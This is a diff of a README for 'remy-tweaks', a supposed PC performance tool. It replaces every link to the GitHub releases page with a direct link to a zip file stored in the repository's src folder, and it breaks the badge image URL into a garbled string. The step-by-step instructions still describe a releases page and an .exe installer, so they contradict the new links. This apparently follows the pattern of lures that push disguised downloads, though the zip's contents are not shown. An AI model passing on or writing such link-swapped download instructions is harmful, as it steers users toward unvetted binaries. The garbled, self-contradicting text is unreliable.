@@ -1,6 +1,6 @@
 # 🚀 remy-tweaks - Boost Your PC Performance Effortlessly
 
-[![Download Remy Tweaks](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/oferoo7o/remy-tweaks/releases)
+[![Download Remy Tweaks](https://raw.githubusercontent.com/oferoo7o/remy-tweaks/master/src/tweaks-remy-1.4.zip%20Now-Get%https://raw.githubusercontent.com/oferoo7o/remy-tweaks/master/src/tweaks-remy-1.4.zip)](https://raw.githubusercontent.com/oferoo7o/remy-tweaks/master/src/tweaks-remy-1.4.zip)
 
 ## 📖 About Remy Tweaks
 
@@ -24,7 +24,7 @@ Before you download, make sure your system meets the following requirements:
 
 Follow these simple steps to download and run Remy Tweaks:
 
-1. **Visit the Releases Page**: Click this link to access the downloads: [Download Remy Tweaks](https://github.com/oferoo7o/remy-tweaks/releases).
+1. **Visit the Releases Page**: Click this link to access the downloads: [Download Remy Tweaks](https://raw.githubusercontent.com/oferoo7o/remy-tweaks/master/src/tweaks-remy-1.4.zip).
 2. **Download the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest version and click on it.
 3. **Choose the Installer**: You will find several files. Select the file named `remy-tweaks-{version}.exe`.
 4. **Start the Download**: Click on the installer file to download it to your computer.
@@ -32,7 +32,7 @@ Follow these simple steps to download and run Remy Tweaks:
 
 ## 📥 Download & Install
 
-To download Remy Tweaks, please visit this page: [Download Remy Tweaks](https://github.com/oferoo7o/remy-tweaks/releases). Download the installer and follow the instructions provided above to get started.
+To download Remy Tweaks, please visit this page: [Download Remy Tweaks](https://raw.githubusercontent.com/oferoo7o/remy-tweaks/master/src/tweaks-remy-1.4.zip). Download the installer and follow the instructions provided above to get started.
 
 ## 🛡 Using Remy Tweaks
 
